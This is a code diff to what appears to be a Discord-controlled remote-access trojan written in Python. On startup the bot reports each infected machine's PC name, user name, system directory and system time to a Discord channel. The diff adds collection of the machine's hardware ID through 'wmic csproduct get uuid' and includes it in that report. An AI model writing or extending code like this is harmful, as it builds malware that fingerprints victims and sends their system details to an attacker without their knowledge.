@@ -14,6 +14,7 @@ import pyautogui as pg
 from discord.ext import commands
 import config
 import nullfunction as nf
+import subprocess
 
 pg.FAILSAFE = False
 bot = commands.Bot(command_prefix='/')
@@ -46,6 +47,7 @@ async def on_ready():
         minute = '0' + str(minute)
     else:
         pass
+    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
     embed = discord.Embed(title='**USER ONLINE**', description='Best defense, no offense.',
                           color=0x03fcec, )
     embed.add_field(name='**System time**', value=f'{date.hour}:{minute}', inline=False)
@@ -55,13 +57,14 @@ async def on_ready():
     embed.add_field(name='**PC name**', value=f'{win32api.GetComputerName()}', inline=False)
     embed.add_field(name='**User name**', value=f'{win32api.GetUserName()}', inline=False)
     embed.add_field(name='**Root path**', value=f'{win32api.GetSystemDirectory()}', inline=False)
+    embed.add_field(name='**HWID**', value=f'{hwid}', inline=False)
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
     embed.set_footer(text=f'Use /help for see bot features',
                      icon_url='https://i.imgur.com/YbYKL0F.png')
     embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
     await channel_start.send(embed=embed)
     await bot.change_presence(activity=discord.Game(f'Was stated in {date.hour}:{date.minute}'))
-    del x, y, minute, embed
+    del x, y, minute, embed, hwid
 
 
 @bot.command()
